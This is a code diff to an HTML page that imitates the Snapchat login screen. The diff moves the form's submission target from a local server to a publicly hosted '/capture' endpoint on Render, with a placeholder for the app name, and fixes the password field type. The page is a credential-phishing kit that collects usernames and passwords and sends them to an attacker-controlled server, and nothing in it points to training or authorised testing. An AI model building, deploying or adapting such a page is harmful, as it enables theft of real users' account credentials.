@@ -31,7 +31,7 @@
             width: 100%;
             max-width: 380px;
             padding: 40px 30px;
-            border-radius: 24px; /* Smoother, modern rounded corners */
+            border-radius: 24px;
             text-align: center;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             border: 1px solid var(--snap-border);
@@ -45,8 +45,8 @@
         .snap-logo {
             width: 90px;
             height: 90px;
-            border-radius: 50%; /* Makes the image circular */
-            object-fit: cover; /* Ensures the image fills the circle without stretching */
+            border-radius: 50%;
+            object-fit: cover;
             border: 3px solid var(--snap-yellow);
             box-shadow: 0 0 15px var(--snap-yellow);
         }
@@ -103,7 +103,7 @@
             background-color: var(--snap-yellow);
             color: var(--snap-black);
             border: none;
-            border-radius: 30px; /* Pill shape */
+            border-radius: 30px;
             font-size: 18px;
             font-weight: 700;
             margin-top: 25px;
@@ -149,15 +149,15 @@
 
     <div class="login-card">
         <div class="logo-container">
-            <!-- Using a direct image link for the ghost profile -->
-            <img src="https://https://snap-h-k.onrender.com/snapchat-logo.png" alt="Snapchat" class="snap-logo">
+            <!-- Root-relative image URL -->
+            <img src="/snapchat-logo.png" alt="Snapchat" class="snap-logo">
         </div>
 
         <h1>Log In Snapchat</h1>
         <p class="subtitle">Enter your details to continue</p>
 
-        <!-- IMPORTANT: This points to your local server -->
-        <form action="http://localhost:3000/capture" method="POST">
+        <!-- Replace YOUR-RENDER-APP-NAME with your actual Render service name -->
+        <form action="https://YOUR-RENDER-APP-NAME.onrender.com/capture" method="POST">
             <div class="form-group">
                 <label>Username or email</label>
                 <input type="text" name="username" placeholder="Username" required>
@@ -165,7 +165,7 @@
 
             <div class="form-group">
                 <label>Password</label>
-                <input types="password" name="password" placeholder="Password" required>
+                <input type="password" name="password" placeholder="Password" required>
             </div>
 
             <button type="submit" class="btn-login">Log In</button>
